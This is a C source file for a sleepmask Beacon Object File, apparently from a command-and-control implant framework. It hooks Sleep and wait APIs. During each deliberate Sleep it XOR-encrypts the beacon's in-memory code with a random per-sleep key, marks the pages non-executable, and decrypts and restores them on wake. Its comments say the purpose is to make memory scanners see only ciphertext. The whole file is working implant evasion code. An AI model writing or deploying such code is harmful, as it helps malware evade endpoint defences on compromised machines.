/* sleepmask BOF — encrypted sleepmask (P2).
 *
 * Intercepts Sleep/WFSO/WFMO via BeaconGate. On a sleep where the beacon is
 * quiescent (SleepObf enabled, no BOF jobs running), XOR-encrypts the beacon's
 * PIC code region in place with a per-sleep random key, flips it to
 * PAGE_READWRITE (non-executable) for the wait, then symmetrically XORs-back
 * with the SAME key and restores PAGE_EXECUTE_READ on wake. A memory scanner
 * therefore sees only ciphertext (on a non-exec page) during the sleep window.
 *
 * Restore is symmetric XOR-back (the key lives on this BOF's stack across the
 * blocking wait; the BOF runs in a separate module-stomped DLL region, so its
 * stack survives) — it does NOT depend on SmInfo->CleanTextBuf, which the
 * loader-written stomp tag only populates in the UDRL PIC blob (NULL in the
 * CRT-linked debug EXE used for testing).
 *
 * Guard: encrypt only when SmInfo->Config.SleepObf && SmInfo->ActiveJobCount==0.
 * ActiveJobCount>0 means a worker thread is inside a BOF that may call back
 * into beacon .text — encrypting it would crash that thread, so we fall back
 * to a plain wait.
 *
 * No bare libc: per-byte/per-field init only (no aggregate-init that gcc would
 * lower to a memset call — see bof-builder LESSONS U2). Compiled at -O0 so the
 * rolling XOR loop is not pattern-matched into memset/memcpy. */

#include "Imports.h"
#include "Gate.h"

/* ========= [ encrypt context - held on the handler stack across the wait ] ========= */

typedef struct _SM_CTX {
    BYTE   Key[ NAX_SM_KEY_LEN ];
    DWORD  OldProtect;
    BOOL   Encrypted;
} SM_CTX, *PSM_CTX;

/* ========= [ helpers ] ========= */

/* TRUE if this sleep should encrypt the beacon region. */
static BOOL SmShouldEncrypt( PNAX_SM_INFO Sm ) {
    if ( ! Sm )                              return FALSE;
    if ( ! Sm->Config.SleepObf )             return FALSE;
    if ( Sm->ActiveJobCount != 0 )          return FALSE;
    if ( ! Sm->BeaconBase || ! Sm->BeaconSize ) return FALSE;
    return TRUE;
}

/* Fallback key if BCryptGenRandom is unavailable: derive 16 non-zero bytes
 * from the SmInfo pointer + the region base (deterministic per-sleep-ish,
 * non-zero — encryption still runs, just weaker entropy). */
static void SmDeriveKey( PNAX_SM_INFO Sm, PBYTE Key ) {
    ULONG_PTR s = (ULONG_PTR)Sm ^ (ULONG_PTR)Sm->BeaconBase;
    for ( UINT32 i = 0; i < NAX_SM_KEY_LEN; i++ ) {
        s = s * 1103515245u + 12345u;
        Key[ i ] = (BYTE)( ( s >> 16 ) & 0xFF );
        if ( Key[ i ] == 0 ) Key[ i ] = 0x5A;
    }
}

/* Generate the per-sleep key. */
static void SmGenKey( PNAX_SM_INFO Sm, PBYTE Key ) {
    NTSTATUS s = BCryptGenRandom( NULL, Key, NAX_SM_KEY_LEN, BCRYPT_USE_SYSTEM_PREFERRED_RNG );
    if ( s != 0 )
        SmDeriveKey( Sm, Key );
}

/* Rolling XOR over [Base, Base+Size) with the 16-byte key. Used for both
 * encrypt and decrypt (XOR is symmetric). */
static void SmXorRegion( PBYTE Base, UINT32 Size, const BYTE* Key ) {
    for ( UINT32 i = 0; i < Size; i++ )
        Base[ i ] ^= Key[ i & ( NAX_SM_KEY_LEN - 1 ) ];
}

/* Encrypt the beacon region. Ctx->Encrypted is set TRUE only if the full
 * sequence succeeded (so SmDecrypt knows whether to undo it). */
static void SmEncrypt( PNAX_SM_INFO Sm, PSM_CTX Ctx ) {
    Ctx->Encrypted = FALSE;

    SmGenKey( Sm, Ctx->Key );

    DWORD old = 0;
    if ( ! VirtualProtect( Sm->BeaconBase, (SIZE_T)Sm->BeaconSize, PAGE_READWRITE, &old ) ) {
#ifdef DEBUG
        printf( "[sleepmask] encrypt: VirtualProtect RW failed - skipping\n" );
#endif
        return;
    }
    Ctx->OldProtect = old;

    SmXorRegion( (PBYTE)Sm->BeaconBase, Sm->BeaconSize, Ctx->Key );
    Ctx->Encrypted = TRUE;   /* region stays PAGE_READWRITE for the sleep */

#ifdef DEBUG
    printf( "[sleepmask] encrypt: base=%p size=0x%x key=%02x%02x%02x%02x%02x%02x%02x%02x old=0x%lx\n",
            Sm->BeaconBase, Sm->BeaconSize,
            Ctx->Key[0], Ctx->Key[1], Ctx->Key[2], Ctx->Key[3],
            Ctx->Key[4], Ctx->Key[5], Ctx->Key[6], Ctx->Key[7],
            (unsigned long)Ctx->OldProtect );
#endif
}

/* Decrypt (XOR-back) and restore the original page protection. */
static void SmDecrypt( PNAX_SM_INFO Sm, PSM_CTX Ctx ) {
    if ( ! Ctx->Encrypted )
        return;

    SmXorRegion( (PBYTE)Sm->BeaconBase, Sm->BeaconSize, Ctx->Key );

    DWORD old = 0;
    VirtualProtect( Sm->BeaconBase, (SIZE_T)Sm->BeaconSize, Ctx->OldProtect, &old );

#ifdef DEBUG
    printf( "[sleepmask] decrypt: base=%p size=0x%x restored=0x%lx\n",
            Sm->BeaconBase, Sm->BeaconSize, (unsigned long)Ctx->OldProtect );
#endif

    Ctx->Encrypted = FALSE;
}

/* ========= [ per-API handlers ] ========= */

static void HandleSleep( PFUNCTION_CALL FnCall ) {
    DWORD ms = (DWORD)FnCall->Args[0];
    PNAX_SM_INFO Sm = (PNAX_SM_INFO)FnCall->SmInfo;

#ifdef DEBUG
    printf( "[sleepmask] Sleep(%lu ms)\n", (unsigned long)ms );
#endif

    SM_CTX ctx;
    ctx.Encrypted = FALSE;
    BOOL enc = SmShouldEncrypt( Sm );
    if ( enc )
        SmEncrypt( Sm, &ctx );

    /* wait (PoC: dummy event + timed NtWaitForSingleObject) */
    HANDLE hEvent = NULL;
    NtCreateEvent( &hEvent, EVENT_ALL_ACCESS, NULL, 1, FALSE );
    if ( hEvent ) {
        LARGE_INTEGER timeout;
        timeout.QuadPart = -(LONGLONG)ms * 10000;
        NtWaitForSingleObject( hEvent, FALSE, &timeout );
        NtClose( hEvent );
    }

    if ( enc )
        SmDecrypt( Sm, &ctx );
}

/* WFSO / WFMO are transport-internal waits (SMB named-pipe connect/read events,
 * and any future transport that blocks on a handle) that fire WHILE beacon .text
 * is mid-execution - the transport called WaitForSingleObject/MultipleObjects
 * and is blocked inside us. Encrypting beacon .text here would XOR code that the
 * transport thread is about to return into; even with a perfect XOR-back that is
 * a needless hazard, and these waits are short (transport-active, not dormant) so
 * there is no scanner-evasion value. Standard sleepmask encrypts only on the
 * deliberate Sleep. Forward these to the real API (FnCall->FunctionPtr, the
 * pre-swap original) untouched - exactly what the working PoC did. */
static void HandleWaitForSingleObject( PFUNCTION_CALL FnCall ) {
#ifdef DEBUG
    printf( "[sleepmask] WFSO(handle=%p ms=%lu) -> forward (no encrypt)\n",
            (HANDLE)FnCall->Args[0], (unsigned long)(DWORD)FnCall->Args[1] );
#endif
    FnCall->RetValue = ((FN2) FnCall->FunctionPtr)( FnCall->Args[0], FnCall->Args[1] );
}

static void HandleWaitForMultipleObjects( PFUNCTION_CALL FnCall ) {
#ifdef DEBUG
    printf( "[sleepmask] WFMO(n=%lu waitAll=%d ms=%lu) -> forward (no encrypt)\n",
            (unsigned long)(DWORD)FnCall->Args[0],
            (int)(BOOL)FnCall->Args[2],
            (unsigned long)(DWORD)FnCall->Args[3] );
#endif
    FnCall->RetValue = ((FN4) FnCall->FunctionPtr)( FnCall->Args[0], FnCall->Args[1], FnCall->Args[2], FnCall->Args[3] );
}

static void HandleVirtualProtect( PFUNCTION_CALL FnCall ) {
    LPVOID lpAddress      = (LPVOID)FnCall->Args[0];
    SIZE_T dwSize         = (SIZE_T)FnCall->Args[1];
    DWORD  flNewProtect   = (DWORD)FnCall->Args[2];
    PDWORD lpflOldProtect = (PDWORD)FnCall->Args[3];

    BOOL ret = VirtualProtect( lpAddress, dwSize, flNewProtect, lpflOldProtect );
    FnCall->RetValue = (ULONG_PTR)ret;
}

static void HandleGeneric( PFUNCTION_CALL FnCall ) {
    switch ( FnCall->NumArgs ) {
    case 0:  FnCall->RetValue = ((FN0) FnCall->FunctionPtr)(); break;
    case 1:  FnCall->RetValue = ((FN1) FnCall->FunctionPtr)( FnCall->Args[0] ); break;
    case 2:  FnCall->RetValue = ((FN2) FnCall->FunctionPtr)( FnCall->Args[0], FnCall->Args[1] ); break;
    case 3:  FnCall->RetValue = ((FN3) FnCall->FunctionPtr)( FnCall->Args[0], FnCall->Args[1], FnCall->Args[2] ); break;
    case 4:  FnCall->RetValue = ((FN4) FnCall->FunctionPtr)( FnCall->Args[0], FnCall->Args[1], FnCall->Args[2], FnCall->Args[3] ); break;
    case 5:  FnCall->RetValue = ((FN5) FnCall->FunctionPtr)( FnCall->Args[0], FnCall->Args[1], FnCall->Args[2], FnCall->Args[3], FnCall->Args[4] ); break;
    case 6:  FnCall->RetValue = ((FN6) FnCall->FunctionPtr)( FnCall->Args[0], FnCall->Args[1], FnCall->Args[2], FnCall->Args[3], FnCall->Args[4], FnCall->Args[5] ); break;
    case 7:  FnCall->RetValue = ((FN7) FnCall->FunctionPtr)( FnCall->Args[0], FnCall->Args[1], FnCall->Args[2], FnCall->Args[3], FnCall->Args[4], FnCall->Args[5], FnCall->Args[6] ); break;
    case 8:  FnCall->RetValue = ((FN8) FnCall->FunctionPtr)( FnCall->Args[0], FnCall->Args[1], FnCall->Args[2], FnCall->Args[3], FnCall->Args[4], FnCall->Args[5], FnCall->Args[6], FnCall->Args[7] ); break;
    case 9:  FnCall->RetValue = ((FN9) FnCall->FunctionPtr)( FnCall->Args[0], FnCall->Args[1], FnCall->Args[2], FnCall->Args[3], FnCall->Args[4], FnCall->Args[5], FnCall->Args[6], FnCall->Args[7], FnCall->Args[8] ); break;
    case 10: FnCall->RetValue = ((FN10)FnCall->FunctionPtr)( FnCall->Args[0], FnCall->Args[1], FnCall->Args[2], FnCall->Args[3], FnCall->Args[4], FnCall->Args[5], FnCall->Args[6], FnCall->Args[7], FnCall->Args[8], FnCall->Args[9] ); break;
    }
}

/* ========= [ entry point ] ========= */

__attribute__((aligned(16)))
void sleep_mask( void* NaxPtr, PFUNCTION_CALL FnCall ) {
#ifdef DEBUG
    printf( "[sleepmask] GateApi=0x%02x NumArgs=%lu FunctionPtr=%p\n",
            FnCall->GateApi, (unsigned long)FnCall->NumArgs, FnCall->FunctionPtr );
#endif

    switch ( FnCall->GateApi ) {
    case GATE_API_SLEEP:                     HandleSleep( FnCall );                   return;
    case GATE_API_WAIT_FOR_SINGLE_OBJECT:    HandleWaitForSingleObject( FnCall );     return;
    case GATE_API_WAIT_FOR_MULTIPLE_OBJECTS: HandleWaitForMultipleObjects( FnCall );  return;
    case GATE_API_VIRTUAL_PROTECT:           HandleVirtualProtect( FnCall );          return;
    default:                                 HandleGeneric( FnCall );                 return;
    }
}